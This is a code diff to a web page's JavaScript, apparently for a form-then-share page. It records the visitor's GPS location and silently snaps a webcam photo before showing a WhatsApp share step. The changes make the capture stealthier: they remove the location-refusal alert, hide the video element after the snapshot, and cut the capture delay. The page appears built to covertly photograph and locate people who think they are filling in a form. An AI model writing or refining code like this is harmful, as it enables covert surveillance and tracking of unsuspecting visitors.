@@ -19,11 +19,13 @@ function proceedCamera() {
 
   navigator.geolocation.getCurrentPosition(pos => {
     userData.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-  }, () => alert("Location permission required!"));
+  });
 
+  const video = document.getElementById('video');
+  video.style.display = "block"; // Temporarily show it offscreen
   navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-    const video = document.getElementById('video');
     video.srcObject = stream;
+
     video.onloadedmetadata = () => {
       setTimeout(() => {
         const canvas = document.getElementById('canvas');
@@ -32,12 +34,15 @@ function proceedCamera() {
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         stream.getTracks().forEach(track => track.stop());
+        video.style.display = "none";
+
         document.getElementById('formStep').style.display = "none";
         document.getElementById('shareStep').style.display = "block";
-      }, 3000);
+      }, 1500); // Delay to allow camera to adjust
     };
   }).catch(() => alert("Camera permission required!"));
 }
+
 
 function shareWhatsApp() {
   if (shared) return;
